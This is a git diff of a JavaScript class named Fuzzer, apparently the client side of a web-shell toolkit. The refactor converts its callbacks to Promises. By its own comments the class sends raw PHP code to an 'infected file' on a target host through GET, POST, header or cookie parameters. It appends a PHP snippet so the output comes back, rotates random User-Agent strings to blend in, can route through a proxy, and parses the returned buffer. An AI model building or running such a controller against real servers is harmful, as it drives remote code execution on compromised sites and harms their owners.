@@ -1,47 +1,40 @@
-let ApiCaller = require('request');
-let UserAgent = require('random-useragent');
+const ApiCaller = require('request');
+const UserAgent = require('random-useragent');
 
 /*
  * @author LeakLessGfy
- * @param {object} config = configuration of Fuzzer
+ * Class to call infected file
  *
- * @config_param string Host = target URL
- * @config_param int Method = Http method for request [0: GET, 1: POST, 2: HEADER, 3: COOKIE]
- * @config_param string Parameter = Infected parameters
- * @config_param int Crypt = Is it a crypted request
- * 
- * {object} callbacks = Default callbacks methods
- * string httpMethod = Http method for request 
- * {object} request = current request
+ * @param {object} config - Fuzzer's configuration
+ * @config {string} Host - target URL
+ * @config {int} Method - Http method for request [0: GET, 1: POST, 2: HEADER, 3: COOKIE]
+ * @config {string} Parameter - Infected parameters
+ * @config {int} Crypt - Crypt method
+ * @config {string} Proxy - Proxy url
  */
 class Fuzzer {
 	constructor(config) {
 		this._host = config.host;
 		this._method = parseInt(config.method);
 		this._parameter = config.parameter || "Dec";
-		this._crypt = config.crypt;
-		this._callbacks = {
-			onSuccess: this.handleSuccess,
-			onError: this.handleError
-		};
+		this._crypt = config.crypt || null;
+		this._httpMethod = this._getHttpMethod();
 
-		let httpMethod = this.getHttpMethod();
 		this._config = {
 			url: this._host,
-			method: httpMethod,
+			method: this._httpMethod,
 			headers: {},
 			form: {},
-			jar: {},
+			jar: null,
 			proxy: config.proxy || null
 		};
-
-		this._buffer = "";
 	}
 
 	/**
-	 * Get php string to get response
+	 * [Private] Get php string to get response
+	 * @return {string} response
 	 */
-	getHandleback() {
+	_getHandleback() {
 		let response;
 
 		switch(this._method) {
@@ -61,9 +54,10 @@ class Fuzzer {
 	}
 
 	/**
-	 * Get Right HTTP Method
+	 * [Private] Get the right HTTP method
+	 * @return {string}
 	 */
-	getHttpMethod() {
+	_getHttpMethod() {
 		if(this._method == 1) {
 			return "POST"
 		}
@@ -71,18 +65,66 @@ class Fuzzer {
 		return "GET";
 	}
 
-	encrypt() {
-		
+	/**
+	 * [Private] Get request's config
+	 * @return {object} config
+	 */
+	_getConfig(r) {
+		let config = null;
+
+		if(typeof r === 'object') {
+			config = r;
+		} else if(typeof r === 'string') {
+			config = this.prepare(r);
+		}
+
+		return config;
 	}
 
 	/**
-	 * Prepare request configuration
+	 * [Private] Get the raw buffer
+	 * @return {object} buffer
+	 */
+	_getBuffer(response, body, cookies, ref) {
+		let buffer = null;
+
+		switch(ref._method) {
+			case 0:
+			case 1: //GET && POST
+				buffer = body;//JSON.parse(response.body);
+				break;
+			case 2: //Header
+				buffer = response.headers[ref._parameter.toLowerCase()];
+				break;
+			case 3: //Cookie
+				let lgt = cookies.length;
+
+				for(var i = 0; i < lgt; i++) {
+					if(cookies[i].key === ref._parameter) {
+						buffer = cookies[i].value;
+						i = cookies.length + 1;
+					}
+				}
+				//JSON.parse(decodeURIComponent(raw));
+				break;
+		}
+
+		logger.log("info", "INFO - Buffer: \n" + buffer);
+
+		return buffer;
+	}
+
+	/**
+	 * Prepare request's configuration
+	 *
+	 * @param {string} request - Raw request in string, usually in PHP
+	 * @return {object} config
 	 */
 	prepare(request) {
 		let config = this._config;
 
 		config.headers["User-Agent"] = UserAgent.getRandom();
-		request = request + this.getHandleback();
+		request = request + this._getHandleback();
 
 		switch(this._method) {
 			case 0: //GET
@@ -108,86 +150,46 @@ class Fuzzer {
 
 	/**
 	 * Send request
+	 * 
+	 * @param {object || string} request - An already formated request or a string that represent the request
+	 * @param {function} bufferCallback - A special buffer handler, most of the case you don't need it
+	 * @return {object}
 	 */
-	send(request, callBag, onSuccess, onError) {
+	send(request, bufferCallback) {
 		var self = this;
 
-		if(typeof request === 'object') {
-			this._config = request;
-		} else if(typeof request === 'string') {
-			this._config = this.prepare(request);
-		} else {
+		this._config = this._getConfig(request);
+		if(this._config === null) {
 			logger.error("ERROR - Request is not valid!");
 			throw new Error("Request is not valid!");
 		}
 
 		logger.log("info", "FINISH - Building config: \n %j \n", this._config, {});
 
-		if(typeof onSuccess == "function") {
-			this._callbacks.onSuccess = onSuccess;
+		if(typeof bufferCallback != "function") {
+			bufferCallback = this._getBuffer;
 		}
 
-		if(typeof onError == "function") {
-			this._callbacks.onError = onError;
-		}
+		return new Promise(function(resolve, reject) {
+			ApiCaller(self._config, function(error, response, body) {
+				if(!error && response.statusCode == 200) {
+					logger.log("info", "INFO - Response: \n %s \n ", response);
+					logger.log("info", "INFO - Body: \n %s \n ", body);
 
-		if(typeof callBag != "object") {
-			callBag = {success: null, error: null};
-		}
-
-		return ApiCaller(this._config, function(error, response, body) {
-			if(!error && response.statusCode == 200) {
-				logger.log("info", "INFO - Response: \n %s \n ", response);
-				logger.log("info", "INFO - Body: \n %s \n ", body);
-
-				if(self._config.jar instanceof ApiCaller.jar) {
-					logger.log("info", "INFO - Cookies: \n %s \n ", self._config.jar.getCookies(self._host), {});
-				}
-
-				return self._callbacks.onSuccess(response, body, self, callBag.success);
-			}
-
-			logger.log("error", "ERROR - Error: \n %j \n", error, {});
-			return self._callbacks.onError(error, response, body, self, callBag.error);
-		});
-	}
-
-	handleSuccess(response, body, ref, event) {
-		let buffer = "Not found!";
-
-		switch(ref._method) {
-			case 0: //GET
-				buffer = JSON.parse(body);
-				break;
-			case 1: //POST
-				buffer = JSON.parse(body);
-				break;
-			case 2: //Header
-				let header = response.headers[ref._parameter.toLowerCase()];
-				buffer = JSON.parse(header);
-				break;
-			case 3: //Cookie
-				let cookies = ref._config.jar.getCookies(ref._host);
-				let lgt = cookies.length;
-
-				let raw = {};
-				for(var i = 0; i < lgt; i++) {
-					if(cookies[i].key === ref._parameter) {
-						raw = cookies[i].value;
+					let cookies = null;
+					if(self._config.jar != null) {
+						cookies = self._config.jar.getCookies(self._host);
+						logger.log("info", "INFO - Cookies: \n %s \n ", cookies);
 					}
+
+					let buffer = bufferCallback(response, body, cookies, self);
+					resolve(buffer);
 				}
 
-				buffer = JSON.parse(decodeURIComponent(raw));
-				break;
-		}
-
-		ref._buffer = buffer;
-		logger.log("info", "INFO - Buffer: \n" + buffer);
-
-		EventListener.emit(event, buffer);
-	}
-
-	handleError(error, response, body, ref) {
+				logger.log("error", "ERROR - Error: \n %j \n", error, {});
+				reject(error);
+			});
+		});
 	}
 }
 
